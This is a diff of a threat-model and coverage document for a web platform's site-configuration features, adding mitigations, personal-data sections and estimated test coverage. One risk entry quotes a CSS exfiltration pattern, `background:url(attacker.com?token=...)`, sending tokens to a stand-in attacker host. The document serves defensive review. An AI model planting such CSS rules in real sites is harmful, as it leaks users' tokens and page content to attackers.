@@ -85,27 +85,30 @@ Public routes public; everything else requires `MANAGE_USERS`. `secret` configs 
 - **Secrets:** The `secret` flag excludes values from public reads; `SSO_PROVIDERS.clientSecret` and `EMAIL_CONFIG.apiKey`/`smtpConfig.pass` are encrypted at rest (AES-256-CBC) and decrypted only for admin display.
 
 **Risks:**
-- **Config takeover:** a missing `MANAGE_USERS` check on admin endpoints would let any user flip security-critical flags (e.g. disable `PUBLIC_VIEWING` gating or enable `SELF_REGISTRATION`) and take over the instance's auth posture.
-- **Secret leakage:** if the `secret` flag were honored only client-side or stripped from a single endpoint, secrets such as SSO `clientSecret` or email API keys could leak via a public read path.
-- **Scope/target_id spoofing:** write endpoints keyed on `(key, scope, target_id)` could let an attacker write into another tenant's/model's scope if scope authorization is not enforced server-side.
+- **Config takeover:** a missing `MANAGE_USERS` check on admin endpoints would let any user flip security-critical flags (e.g. disable `PUBLIC_VIEWING` gating or enable `SELF_REGISTRATION`) and take over the instance's auth posture. *Mitigation:* writes require `MANAGE_USERS`; keep the permission middleware on every admin CRUD/scope/by-keys/bulk-upsert route and fails secure if config missing.
+- **Secret leakage:** if the `secret` flag were honored only client-side or stripped from a single endpoint, secrets such as SSO `clientSecret` or email API keys could leak via a public read path. *Mitigation:* the system encrypts secret-flagged values at rest (AES-256-CBC) and strips them from all public reads server-side; keep the `secret` gate enforced on every read path.
+- **Scope/target_id spoofing:** write endpoints keyed on `(key, scope, target_id)` could let an attacker write into another tenant's/model's scope if scope authorization is not enforced server-side. *Mitigation:* writes require `MANAGE_USERS`; enforce scope authorization server-side on `(key, scope, target_id)` and reject cross-scope writes.
 
-### Data protection
+### Personal data processing
+No — this capability does not process personal data. (config values only; `created_by`/`updated_by` hold admin user ObjectIds, refs not PII.)
+N/A
+**Risks:**
+- none — no personal data processed.
 
+### AutoWRX data
 `secret` flag hides values from public reads; SSO provider secrets + email API keys **encrypted at rest**, decrypted only for admin display.
-
 **Coverage:**
 - **Stored data:** `site_configs` collection (fields: `key`, `scope`, `target_id`, `value` (Mixed), `valueType`, `secret`, `description`, `category`, `created_by`, `updated_by`); `SiteConfigSnapshot` mirrors site-scope configs for restore; unique index on `(key, scope, target_id)`.
-- **PII:** no — config values only; `created_by`/`updated_by` hold admin user ObjectIds (refs, not PII).
 - **Retention:** indefinite — no TTL; deletes are hard deletes.
 - **Encryption:** AES-256-CBC at rest for secret-flagged `SSO_PROVIDERS.clientSecret` and `EMAIL_CONFIG.apiKey`/`smtpConfig.pass`; non-secret values stored plaintext.
 - **Logging:** none / N/A — no config values logged on the success path.
-
 **Risks:**
 - **Plaintext-at-rest fallback:** if encryption were bypassed or a new secret type were added without wiring it through `utils/encryption.js`, secrets would sit in plaintext and a DB dump would expose live credentials.
 - **Admin-display interception:** secrets are decrypted for admin display, so a compromised admin session or logged response body leaks usable SSO/email credentials directly.
 
 ### Test coverage
 - **E2E (Playwright):** 2 test case(s) in `site-config-restore-default.spec.ts` — SITEMAP: ⚠️ (public config write+read asserted as scaffolding for restore-default; admin CRUD endpoint matrix, by-keys, bulk-upsert, scoped reads, and secret handling not exercised)
+- **Estimated coverage:** ≈15% (est.) — 2 E2E cases assert public config write+read as restore-default scaffolding; admin CRUD matrix, by-keys, bulk-upsert, scoped reads, and secret handling untested (~4 acceptance paths).
 - **Unit (Jest):** none
 
 ## CAP-CONFIG-02 — Site Config management (admin)
@@ -147,26 +150,29 @@ flowchart TD
 - **Secrets:** secret sections mask values in the UI; SSO `clientSecret` and EMAIL `apiKey`/`smtpConfig.pass` are encrypted at rest and decrypted only for admin display within the Secret/SSO/Email sections.
 
 **Risks:**
-- **Single-gate blast radius:** every section sits behind the same `MANAGE_USERS` permission, so one compromised admin (or one overly-broad grant) can rewrite auth, SSO, email, and feature flags simultaneously.
-- **History restore abuse:** if restore-from-history lacked re-authorization, an attacker who once held `MANAGE_USERS` could replay an old config (e.g. re-enabling disabled SSO) after their access was revoked.
+- **Single-gate blast radius:** every section sits behind the same `MANAGE_USERS` permission, so one compromised admin (or one overly-broad grant) can rewrite auth, SSO, email, and feature flags simultaneously. *Mitigation:* writes require `MANAGE_USERS`; none currently — consider splitting the shared gate into per-section permissions for Auth/SSO/Email/Secret and require step-up auth for secret-bearing sections.
+- **History restore abuse:** if restore-from-history lacked re-authorization, an attacker who once held `MANAGE_USERS` could replay an old config (e.g. re-enabling disabled SSO) after their access was revoked. *Mitigation:* writes require `MANAGE_USERS`; re-check the permission at restore time (not at snapshot creation) and audit who restored which snapshot.
 
-### Data protection
+### Personal data processing
+No — this capability does not process personal data. (administrative configuration only; `created_by`/`updated_by` are admin user refs, not PII.)
+N/A
+**Risks:**
+- none — no personal data processed.
 
+### AutoWRX data
 Edit history (snapshots) retained; secret sections mask values.
-
 **Coverage:**
 - **Stored data:** `site_configs` (live config) + `SiteConfigSnapshot` (edit history / deploy snapshot) — site-scope configs including encrypted secret values in SSO/Email/Secret sections; admin user ids in `created_by`/`updated_by`.
-- **PII:** no — administrative configuration only; `created_by`/`updated_by` are admin user refs.
 - **Retention:** indefinite — snapshots retained until overwritten by a new deploy-seed sync or manual restore; no TTL on live configs.
 - **Encryption:** secrets stored encrypted (AES-256-CBC) in both live config and snapshots; non-secret config plaintext.
 - **Logging:** none / N/A — no section edits or secret values logged.
-
 **Risks:**
 - **Snapshot retention of secrets:** edit history snapshots may retain prior secret values; if those snapshots aren't masked/encrypted like the live config, old credentials remain recoverable.
 - **Change history leak:** config edit history can reveal administrative actions, SSO provider changes, and email setup patterns to anyone with admin access.
 
 ### Test coverage
 - **E2E (Playwright):** 8 test case(s) in `admin.spec.ts` (1 — site-config page loads) + `nav-bar-actions.spec.ts` (7 — navbar-actions section editor within site-config) — SITEMAP: ⚠️ (page load + nav section covered; 10 of 11 sections incl. Auth/SSO/Email/Secret/Privacy untested)
+- **Estimated coverage:** ≈25% (est.) — 8 E2E cases cover page load + nav section editor; 10 of 11 sections (Auth/SSO/Email/Secret/Privacy) untested across ~11 acceptance paths.
 - **Unit (Jest):** none
 
 ## CAP-CONFIG-03 — Global CSS theming
@@ -214,26 +220,29 @@ All three `/v2/site-config/global-css` endpoints require auth + `MANAGE_USERS`; 
 - **Secrets:** none — stylesheet text only; no credentials involved.
 
 **Risks:**
-- **CSS-based exfiltration:** even without `<script>`, an attacker who can write the stylesheet can craft `background:url(attacker.com?token=...)`-style rules to exfiltrate page content and tokens, or use `@import` to pull remote stylesheets.
-- **Unauthenticated styling takeover:** if `PUT` lacked the `MANAGE_USERS` check, anyone could restyle the site (defacement) or mount phishing-by-styling (hiding warnings, recoloring buttons to lure clicks).
-- **DOM-based attacks via selectors:** hostile selectors combined with `attr()`/content tricks can extract attributes from rendered DOM and leak them via image requests.
+- **CSS-based exfiltration:** even without `<script>`, an attacker who can write the stylesheet can craft `background:url(attacker.com?token=...)`-style rules to exfiltrate page content and tokens, or use `@import` to pull remote stylesheets. *Mitigation:* none currently — sanitize admin-supplied CSS/markdown (strip `url()`/`@import` to external hosts) and apply a CSP on `/static/global.css`.
+- **Unauthenticated styling takeover:** if `PUT` lacked the `MANAGE_USERS` check, anyone could restyle the site (defacement) or mount phishing-by-styling (hiding warnings, recoloring buttons to lure clicks). *Mitigation:* writes require `MANAGE_USERS`; keep the auth middleware on `PUT`/`POST /global-css/restore-default` and fails secure if config missing.
+- **DOM-based attacks via selectors:** hostile selectors combined with `attr()`/content tricks can extract attributes from rendered DOM and leak them via image requests. *Mitigation:* none currently — sanitize admin-supplied CSS/markdown (disallow `attr()`/content tricks that read DOM attributes).
 
-### Data protection
+### Personal data processing
+No — this capability does not process personal data. (stylesheet text only; no user PII stored.)
+N/A
+**Risks:**
+- none — no personal data processed.
 
+### AutoWRX data
 Stylesheet text only; no PII.
-
 **Coverage:**
 - **Stored data:** `static/global.css` file on disk (not in `site_configs`); `static/global_org.css` holds the shipped default copied over on restore.
-- **PII:** no — stylesheet text only.
 - **Retention:** indefinite — file persists on disk until overwritten by `PUT` or `restore-default`; no versioning.
 - **Encryption:** none — plaintext CSS file on the backend filesystem.
 - **Logging:** none / N/A — no logging of CSS content.
-
 **Risks:**
 - **Indirect PII leak:** if CSS can target elements that render user data (e.g. names in attribute values), attribute-value exfiltration could disclose PII to an attacker-controlled endpoint.
 
 ### Test coverage
 - **E2E (Playwright):** 0 — not covered — SITEMAP: ❌ (no spec exercises `GET/PUT /global-css`, `/global-css/restore-default`, or `/static/global.css` theming)
+- **Estimated coverage:** ≈0% (est.) — no E2E spec.
 - **Unit (Jest):** none
 
 ## CAP-CONFIG-04 — Home config editor
@@ -273,25 +282,28 @@ Admin only.
 - **Secrets:** none — `CFG_HOME_CONTENT` is non-secret public content.
 
 **Risks:**
-- **Stored XSS via block content:** if block titles/descriptions/image URLs are rendered without sanitization, an admin (or a compromised admin account) could inject markup/scripts into every visitor's landing page.
-- **Malicious image URL redirect:** `image_url` fields, if not validated, could point to attacker-controlled hosts used for tracking or to serve malicious payloads.
+- **Stored XSS via block content:** if block titles/descriptions/image URLs are rendered without sanitization, an admin (or a compromised admin account) could inject markup/scripts into every visitor's landing page. *Mitigation:* none currently — sanitize admin-supplied CSS/markdown (block titles/descriptions/image URLs) before render.
+- **Malicious image URL redirect:** `image_url` fields, if not validated, could point to attacker-controlled hosts used for tracking or to serve malicious payloads. *Mitigation:* none currently — validate `image_url` fields against a protocol/hostname allowlist server-side.
 
-### Data protection
+### Personal data processing
+No — this capability does not process personal data. (marketing/landing content; admin-entered free text could in principle include names but no user PII is system-stored here.)
+N/A
+**Risks:**
+- none — no personal data processed.
 
+### AutoWRX data
 Block content (titles/descriptions/image URLs); `requiredLogin` flags on action buttons.
-
 **Coverage:**
 - **Stored data:** `CFG_HOME_CONTENT` value (array of block objects: hero, feature-list, button-list, news, recent, popular, partner-list, home-footer) in `site_configs` (scope `site`, non-secret); edit-history snapshots in `SiteConfigSnapshot`.
-- **PII:** no — marketing/landing content; admin-entered free text could in principle include names but no user PII is system-stored here.
 - **Retention:** indefinite — config value persists until edited/restored; snapshots per sync cycle.
 - **Encryption:** none — plaintext public config value.
 - **Logging:** none / N/A — no logging of block content.
-
 **Risks:**
 - **Login-flow confusion:** a `requiredLogin` flag on action buttons drives auth gating; if misconfigured or tampered with, buttons could route users to attacker-controlled auth flows (credential phishing) from the public landing page.
 
 ### Test coverage
 - **E2E (Playwright):** 0 — not covered — SITEMAP: ❌ (`home-sections.spec.ts` renders home blocks but does not exercise the `CFG_HOME_CONTENT` admin editor, raw JSON, preview, or history)
+- **Estimated coverage:** ≈0% (est.) — no E2E spec.
 - **Unit (Jest):** none
 
 ## CAP-CONFIG-05 — Branding
@@ -324,25 +336,28 @@ Public read; admin write.
 - **Secrets:** none — branding values are public.
 
 **Risks:**
-- **Brand spoofing via logo URL:** `SITE_LOGO_WIDE`/`SITE_FAVICON` are URLs; if an admin (or anyone with write access) sets them to an external host, the site loads third-party assets, enabling tracking or phishing via a swapped logo.
-- **Phishing via title/description:** a malicious `SITE_TITLE`/`SITE_DESCRIPTION` could impersonate another brand on the public site and browser tab, aiding credential phishing.
+- **Brand spoofing via logo URL:** `SITE_LOGO_WIDE`/`SITE_FAVICON` are URLs; if an admin (or anyone with write access) sets them to an external host, the site loads third-party assets, enabling tracking or phishing via a swapped logo. *Mitigation:* none currently — validate `SITE_LOGO_WIDE`/`SITE_FAVICON` against a protocol/hostname allowlist server-side and restrict to known hosts.
+- **Phishing via title/description:** a malicious `SITE_TITLE`/`SITE_DESCRIPTION` could impersonate another brand on the public site and browser tab, aiding credential phishing. *Mitigation:* writes require `MANAGE_USERS`; none currently — add an admin review workflow for `SITE_TITLE`/`SITE_DESCRIPTION` before publish.
 
-### Data protection
+### Personal data processing
+No — this capability does not process personal data. (branding text/asset URLs only.)
+N/A
+**Risks:**
+- none — no personal data processed.
 
+### AutoWRX data
 Branding asset URLs only.
-
 **Coverage:**
 - **Stored data:** `SITE_TITLE`, `SITE_LOGO_WIDE`, `SITE_FAVICON`, `SITE_THEME_COLOR`, `SITE_DESCRIPTION` values in `site_configs` (scope `site`, `secret: false`).
-- **PII:** no — branding text/asset URLs.
 - **Retention:** indefinite — public config values persist until edited/restored.
 - **Encryption:** none — plaintext public config.
 - **Logging:** none / N/A — branding values exposed via public read by design.
-
 **Risks:**
 - **Asset-URL leakage:** branding URLs can reveal internal hosting paths or third-party providers in the public config response.
 
 ### Test coverage
 - **E2E (Playwright):** 7 test case(s) in `nav-bar-actions.spec.ts` — SITEMAP: ⚠️ (NAV_BAR_ACTIONS editor + navbar rendering covered; `SITE_TITLE`/`SITE_LOGO_WIDE`/`SITE_FAVICON`/`SITE_THEME_COLOR`/`SITE_DESCRIPTION` not directly tested)
+- **Estimated coverage:** ≈30% (est.) — 7 E2E cases cover NAV_BAR_ACTIONS editor + navbar rendering; the 5 branding keys (`SITE_TITLE`/`SITE_LOGO_WIDE`/`SITE_FAVICON`/`SITE_THEME_COLOR`/`SITE_DESCRIPTION`) not directly tested.
 - **Unit (Jest):** none
 
 ## CAP-CONFIG-06 — Auth config flags
@@ -385,26 +400,29 @@ Public (effective flags observable); admin to change; safe-default all-false on 
 - **Secrets:** none — boolean flags only.
 
 **Risks:**
-- **Flag tampering to bypass auth:** if the admin write check on these flags were weak, an attacker could flip `PUBLIC_VIEWING=true` or `SELF_REGISTRATION=true` to weaken access controls or open anonymous registration.
-- **Fail-open on load error:** the design secure-fails to all-false; if that fallback regressed to fail-open, a config-load error would silently expose the site to anonymous users.
-- **Observability leak:** effective flags are publicly observable, which can help attackers probe which auth paths are enabled (e.g. whether self-registration is open).
+- **Flag tampering to bypass auth:** if the admin write check on these flags were weak, an attacker could flip `PUBLIC_VIEWING=true` or `SELF_REGISTRATION=true` to weaken access controls or open anonymous registration. *Mitigation:* writes require `MANAGE_USERS`; fails secure if config missing (all-false fallback); keep the permission middleware on the flag-write route.
+- **Fail-open on load error:** the design secure-fails to all-false; if that fallback regressed to fail-open, a config-load error would silently expose the site to anonymous users. *Mitigation:* the system secure-fails to all-false on config-load error; keep the fail-closed fallback and add a regression test for the error path.
+- **Observability leak:** effective flags are publicly observable, which can help attackers probe which auth paths are enabled (e.g. whether self-registration is open). *Mitigation:* none currently — flags are public by design for client gating; document as an accepted trade-off.
 
-### Data protection
+### Personal data processing
+No — this capability does not process personal data. (boolean flags only.)
+N/A
+**Risks:**
+- none — no personal data processed.
 
+### AutoWRX data
 Boolean flags only.
-
 **Coverage:**
 - **Stored data:** `PUBLIC_VIEWING`, `SELF_REGISTRATION`, `SSO_AUTO_REGISTRATION`, `PASSWORD_MANAGEMENT` boolean values in `site_configs` (scope `site`, `secret: false`, `category: 'auth'`); cached in memory for up to 5 min and loaded per request.
-- **PII:** no — boolean flags only.
 - **Retention:** indefinite — config flags persist until changed/restored; cache evicted after 5 min.
 - **Encryption:** none — plaintext booleans (non-secret by design).
 - **Logging:** none / N/A — no flag values logged on the success path.
-
 **Risks:**
 - **Inference of attack surface:** while flags are booleans only, exposing which gates are enabled tells an attacker exactly which registration/SSO avenues to target.
 
 ### Test coverage
 - **E2E (Playwright):** 0 — not covered — SITEMAP: ❌ (`admin-features.spec.ts` tests feature role assignment, not auth config flag toggling; no spec exercises `PUBLIC_VIEWING`/`SELF_REGISTRATION`/`SSO_AUTO_REGISTRATION`/`PASSWORD_MANAGEMENT` gating)
+- **Estimated coverage:** ≈0% (est.) — no E2E spec.
 - **Unit (Jest):** none
 
 ## CAP-CONFIG-07 — SSO & Email configuration
@@ -452,27 +470,29 @@ Secrets encrypted at rest; never in public reads; admin-only writes.
 - **Secrets:** `SSO_PROVIDERS[].clientSecret` and `EMAIL_CONFIG.apiKey`/`smtpConfig.pass` are encrypted at rest (AES-256-CBC) and decrypted only for admin display in the SSO/Email sections; `clientSecret` is removed before any public response.
 
 **Risks:**
-- **SSO secret theft:** a compromised admin session decrypts `clientSecret` for display; a stolen secret lets an attacker impersonate the SP and intercept SSO logins.
-- **Email API key abuse:** a leaked `EMAIL_CONFIG` apiKey/smtp credentials let an attacker send mail as the platform (phishing from a trusted domain) or exhaust the mail quota.
-- **Provider-list spoofing:** if the public providers endpoint returned config beyond the enabled flag, it could leak redirect URLs / client IDs useful for phishing.
+- **SSO secret theft:** a compromised admin session decrypts `clientSecret` for display; a stolen secret lets an attacker impersonate the SP and intercept SSO logins. *Mitigation:* the system encrypts secret-flagged values at rest (AES-256-CBC); `clientSecret` is stripped from public responses; rotate secrets on suspected compromise and audit admin reads.
+- **Email API key abuse:** a leaked `EMAIL_CONFIG` apiKey/smtp credentials let an attacker send mail as the platform (phishing from a trusted domain) or exhaust the mail quota. *Mitigation:* the system encrypts secret-flagged values at rest (AES-256-CBC); writes require `MANAGE_USERS`; rotate keys on suspected leak and throttle test-send.
+- **Provider-list spoofing:** if the public providers endpoint returned config beyond the enabled flag, it could leak redirect URLs / client IDs useful for phishing. *Mitigation:* the public `/sso/providers` endpoint returns only the enabled flag + provider name (no `clientSecret`/redirect); keep the response shape minimal.
 
-### Data protection
+### Personal data processing
+Yes — `POST /v2/site-config/email/test` takes an admin-supplied `to` recipient email address, returned in the response message `Test email sent to <to>`. (SSO `clientSecret` and `EMAIL_CONFIG` `apiKey`/`smtpConfig.pass` are secrets/AutoWRX-operational, not personal data.)
+The recipient address is collected from the admin caller, used only to address the test email, surfaced in the test-send response (and any mail logs), retained only in request logs (no persisted personal-data record), protected by TLS in transit, and accessible only to the admin who triggers the send.
+**Risks:**
+- **Recipient disclosure in logs:** test-send response/logs may include the recipient address, surfacing the admin's email (and any test recipients) in audit/log stores.
 
+### AutoWRX data
 Secrets (`clientSecret`/`apiKey`/`smtpConfig.pass`) encrypted; email logs may include recipient addresses.
-
 **Coverage:**
 - **Stored data:** `SSO_PROVIDERS` (array of provider objects incl. encrypted `clientSecret`) and `EMAIL_CONFIG` (object incl. encrypted `apiKey`/`smtpConfig.pass`) in `site_configs` (scope `site`, `secret: true`).
-- **PII:** no provider PII — but `POST /email/test` takes a `to` recipient email address (admin-supplied) returned in the response message `Test email sent to <to>`.
 - **Retention:** indefinite — encrypted secrets persist until an admin rotates them; no TTL/expiry.
 - **Encryption:** AES-256-CBC at rest for `clientSecret`, `apiKey`, `smtpConfig.pass`; already-encrypted values are not re-encrypted.
 - **Logging:** the test-send response includes the recipient address; no secrets logged on the success path.
-
 **Risks:**
-- **Recipient disclosure in logs:** test-send logs may include recipient addresses, surfacing the admin's email (and any test recipients) in audit/log stores.
 - **Persistent credential reuse:** encrypted secrets persist until rotated; a past compromise leaves stolen credentials valid until an admin manually rotates them.
 
 ### Test coverage
 - **E2E (Playwright):** 0 — not covered — SITEMAP: ❌ (no spec exercises SSO provider CRUD, `/sso/providers` public list, `EMAIL_CONFIG` setup, or `/email/test`)
+- **Estimated coverage:** ≈0% (est.) — no E2E spec.
 - **Unit (Jest):** none
 
 ## CAP-CONFIG-08 — Site config snapshots & restore
@@ -514,26 +534,29 @@ Admin only.
 - **Secrets:** the snapshot preserves `secret`-flagged configs in their encrypted form; restore re-upserts encrypted values (no decryption during restore); decrypted only on a subsequent admin read.
 
 **Risks:**
-- **Snapshot replay of weak config:** an attacker who reaches `restore-snapshot` could replay an older, less-secure snapshot (e.g. before SSO was hardened), reverting the instance to a vulnerable posture.
-- **Predefined-default downgrade:** if a key is missing from the snapshot, predefined defaults are applied; if predefined defaults ever contained a weak value historically, restore could re-introduce it.
+- **Snapshot replay of weak config:** an attacker who reaches `restore-snapshot` could replay an older, less-secure snapshot (e.g. before SSO was hardened), reverting the instance to a vulnerable posture. *Mitigation:* writes require `MANAGE_USERS`; fails secure if config missing; none currently — log who restored which snapshot and consider snapshot provenance/audit trail.
+- **Predefined-default downgrade:** if a key is missing from the snapshot, predefined defaults are applied; if predefined defaults ever contained a weak value historically, restore could re-introduce it. *Mitigation:* keep predefined defaults reviewed before each release; restore requires `MANAGE_USERS` and fails secure if config missing.
 
-### Data protection
+### Personal data processing
+No — this capability does not process personal data. (config values + admin user refs only.)
+N/A
+**Risks:**
+- none — no personal data processed.
 
+### AutoWRX data
 Snapshots hold site-scope configs incl. encrypted secrets.
-
 **Coverage:**
 - **Stored data:** `SiteConfigSnapshot` collection — mirrors site-scope `site_configs` (`key`, `scope`, `value`, `valueType`, `secret`, `description`, `category`); auto-synced when the deploy seeder runs; a `SiteConfigSnapshotMeta` record tracks the last-synced seed run.
-- **PII:** no — config values + admin user refs only.
 - **Retention:** only the latest snapshot is retained — sync replaces prior snapshots before reinserting; no TTL.
 - **Encryption:** secrets stored encrypted in snapshots (same AES-256-CBC as live config; not re-encrypted during sync/restore).
 - **Logging:** sync logs a count and timestamp only — no config values.
-
 **Risks:**
 - **Snapshot of secrets at rest:** snapshots include encrypted secrets; if encryption keys are rotated but old snapshots aren't re-encrypted, they become unreadable or, worse, decryptable with a leaked old key.
 - **Recovery-time secret exposure:** during restore, decrypted secrets may flow into admin-visible output/logs, widening the window for capture.
 
 ### Test coverage
 - **E2E (Playwright):** 2 test case(s) in `site-config-restore-default.spec.ts` — SITEMAP: ✅ (`Restore default` button in Public section calls `restoreConfigsFromSnapshot` → `POST /site-config/restore-snapshot`; revert + cancel flows covered)
+- **Estimated coverage:** ≈80% (est.) — 2 E2E cases cover the restore-default button → `restore-snapshot` and revert/cancel flows; filter params (`keys`/`categories`/`secret`) and per-key source labeling untested.
 - **Unit (Jest):** none
 
 ## CAP-CONFIG-09 — Privacy policy
@@ -573,23 +596,26 @@ Page public; editor admin.
 - **Secrets:** none — policy markdown/URL are non-secret public content.
 
 **Risks:**
-- **Markdown XSS:** if `PRIVACY_POLICY_CONTENT` markdown is rendered without sanitization, an admin (or compromised admin) could inject scripts into a page visited by every user for legal/trust reasons.
-- **Redirect abuse via `PRIVACY_POLICY_URL`:** if `PRIVACY_POLICY_URL` can be set to an external URL, an attacker with admin access could redirect the privacy policy to a phishing page, undermining legal trust.
+- **Markdown XSS:** if `PRIVACY_POLICY_CONTENT` markdown is rendered without sanitization, an admin (or compromised admin) could inject scripts into a page visited by every user for legal/trust reasons. *Mitigation:* none currently — sanitize admin-supplied CSS/markdown (`PRIVACY_POLICY_CONTENT`) before render.
+- **Redirect abuse via `PRIVACY_POLICY_URL`:** if `PRIVACY_POLICY_URL` can be set to an external URL, an attacker with admin access could redirect the privacy policy to a phishing page, undermining legal trust. *Mitigation:* none currently — validate `PRIVACY_POLICY_URL` against a protocol/hostname allowlist server-side (https only).
 
-### Data protection
+### Personal data processing
+No — this capability does not process personal data. (legal text only; privacy policy content is not personal data; no user data stored.)
+N/A
+**Risks:**
+- none — no personal data processed.
 
+### AutoWRX data
 Policy markdown only.
-
 **Coverage:**
 - **Stored data:** `PRIVACY_POLICY_CONTENT` (markdown string) and `PRIVACY_POLICY_URL` (string) in `site_configs` (scope `site`, `secret: false`); edit-history snapshots in `SiteConfigSnapshot`.
-- **PII:** no — legal text only; no user data stored.
 - **Retention:** indefinite — public config values persist until edited/restored.
 - **Encryption:** none — plaintext public config (non-secret).
 - **Logging:** none / N/A — no logging of policy content.
-
 **Risks:**
 - **Legal-text tampering:** unauthorized edits to the published policy could change stated data-handling commitments, creating legal exposure and misleading users about what their data is used for.
 
 ### Test coverage
 - **E2E (Playwright):** 0 — not covered — SITEMAP: ❌ (no spec exercises the `/privacy-policy` page render, `PrivacyPolicySection` editor, preview, or history)
+- **Estimated coverage:** ≈0% (est.) — no E2E spec.
 - **Unit (Jest):** none
